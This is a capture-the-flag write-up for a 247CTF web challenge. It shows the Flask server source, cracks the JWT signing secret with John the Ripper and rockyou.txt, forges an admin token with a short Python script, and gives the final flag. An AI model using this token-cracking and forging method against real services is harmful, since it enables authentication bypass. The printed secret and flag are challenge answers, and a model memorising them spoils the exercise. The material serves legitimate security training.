## FLAG AUTHORISER  

<img src="images/chall.png" width=600>

The server uses an `access_token_cookie` cookie for authentication. In the `/flag` endpoint, the  `identity` field of the cookie must be set to `admin` for the flag to be rendered.  

Since `jwt_secret` and `admin_flag` are imported directly from `secret.py`, it's logical to assume that the JWT secret key is hardcoded, and is thus bruteforceable.  

```python
from flask import Flask, redirect, url_for, make_response, render_template, flash
from flask_jwt_extended import JWTManager, create_access_token, jwt_optional, get_jwt_identity
from secret import secret, admin_flag, jwt_secret

app = Flask(__name__)
cookie = "access_token_cookie"

app.config['SECRET_KEY'] = secret
app.config['JWT_SECRET_KEY'] = jwt_secret
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['DEBUG'] = False

jwt = JWTManager(app)

def redirect_to_flag(msg):
    flash('%s' % msg, 'danger')
    return redirect(url_for('flag', _external=True))

@jwt.expired_token_loader
def my_expired_token_callback():
    return redirect_to_flag('Token expired')

@jwt.invalid_token_loader
def my_invalid_token_callback(callback):
    return redirect_to_flag(callback)

@jwt_optional
def get_flag():
    if get_jwt_identity() == 'admin':
        return admin_flag

@app.route('/flag')
def flag():
    response = make_response(render_template('main.html', flag=get_flag()))
    response.set_cookie(cookie, create_access_token(identity='anonymous'))
    return response

@app.route('/')
def source():
    return "%s" % open(__file__).read()

if __name__ == "__main__":
    app.run()
```

We can first visit `/flag` to get a guest-level token, then use John the Ripper and `rockyou.txt` to crack the token secret, revealing it to be `wepwn247`.  

```bash
echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiNWU5ZGUwYjMtYjg0Ny00MmVhLWFiOWEtMmNlYzU0ZjYxZTY1IiwianRpIjoiZjVlMWUyMzAtOTY4MC00ZWYxLTlkZDYtNmYxOTljMjc4N2UxIiwiZXhwIjoxNzcwNzcyMTM0LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc3MDc3MTIzNCwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc3MDc3MTIzNCwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.uN4HXwV-6IcpF7OaJXAgL1Wo8cWFCIkZ0pMTSAcDQ-4 > hash.txt

john --wordlist=rockyou.txt hash.txt
```

Using the secret, we can modify the existing guest token payload to have admin perms, then forge a valid admin token.  

```python
res = requests.get(f'{url}/flag')

cookie = res.cookies[cookie_name]
token = json.loads(base64.b64decode(cookie.split(".")[1] + '==').decode())

secret = 'wepwn247'

token['identity'] = 'admin'
payload = jwt.encode(token, secret, algorithm='HS256')
print(payload)
```

Visiting `/flag` with our admin token will get the flag to render.  

<img src="images/flag.png" width=600>

Flag: `247CTF{df766362b470d11495214b2f8a4a31b3}`